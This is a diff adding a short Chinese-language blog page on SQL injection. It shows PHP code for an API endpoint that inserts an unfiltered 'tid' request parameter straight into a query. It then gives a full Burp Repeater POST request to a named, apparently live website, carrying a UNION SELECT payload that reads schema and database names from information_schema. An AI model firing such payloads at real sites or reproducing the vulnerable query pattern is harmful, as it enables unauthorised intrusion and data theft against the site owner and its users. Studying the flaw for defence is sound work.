@@ -1,0 +1,105 @@
+---
+title: "MySQL injection"
+layout: page
+date: 2017-06-15 23:00
+---
+
+
+# MySQL injection
+
+
+接受post参数代码
+```
+function requestData()
+{
+    if($_SERVER['REQUEST_METHOD'] == "POST")
+    {
+        $header = getallheaders();
+        $content_type = $header['Content-Type'];
+
+        switch ($content_type)
+        {
+            case 'application/x-www-form-urlencoded':
+                $data = $_POST;
+                break;
+            case 'application/json':
+                $data = file_get_contents("php://input");
+                $data = json_decode($data, true);
+                break;
+            default:
+                $data = file_get_contents("php://input");
+                $data = json_decode($data, true);
+                break;
+        }
+//        file_put_contents('./Public/test', json_encode($data));
+        $requestData = $data['requestData'];
+        if(!is_array($requestData)) {
+            $requestData = stripslashes($requestData);
+            $requestData = json_decode($requestData);
+        }
+        return $requestData;
+    }
+    else
+    {
+        header('content-type:application/json;charset=utf-8');
+        die(json_encode(responseData(false, '不被允许的请求类型')));
+    }
+}
+```
+
+获取详情接口
+
+```
+public function detail()
+{
+    $requestData =requestData();
+    $uid =$requestData['tid'];
+    $User = M('User');
+    $info = $User
+        ->alias('u')
+        ->join('LEFT JOIN sq_user_teacher_detail as t on u.id=t.uid')
+        ->join('LEFT JOIN sq_baiducity as b on t.cityid=b.id')
+        ->where('u.id='.$uid)
+        ->field('u.id as tid,u.nickname,u.avator,b.name as cityname,t.star,t.score,t.hours,t.address,t.label,t.signature,t.seniority')
+        ->find();
+    if(!$info){
+        $this->ajaxReturn(responseData(false,'暂无相关数据'));
+    }else{
+        $uid = $requestData['uid'];
+        if($uid == 0) {
+            $info['iscollect'] = '0';
+        } else {
+            $iscollect = M('Collect')->where(['uid' => $uid, 'tid' => $info['tid']])->find();
+            if($iscollect) {
+                $info['iscollect'] = '1';
+            } else {
+                $info['iscollect'] = '0';
+            }
+        }
+        $this->ajaxReturn(responseData(true,'获取成功',$info));
+    }
+}
+```
+
+接到参数没有进行任何过滤,where()中sql语句没有使用，数组，也不会进行过滤
+
+使用brupsuit 的 repeater
+
+```
+POST /index.php/Apis/Teacher/detail HTTP/1.1
+Host: shiqiao.51ruanron.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://shiqiao.51ruanron.com
+Content-Length: 136
+Connection: close
+
+requestData[tid]=null) union all select 1,1,1,1,1,1,1,SQL_PATH,SCHEMA_NAME,database(),1 from information_schema.SCHEMATA limit 1,1 --
+```
+
+可直接拿到数据库信息
+
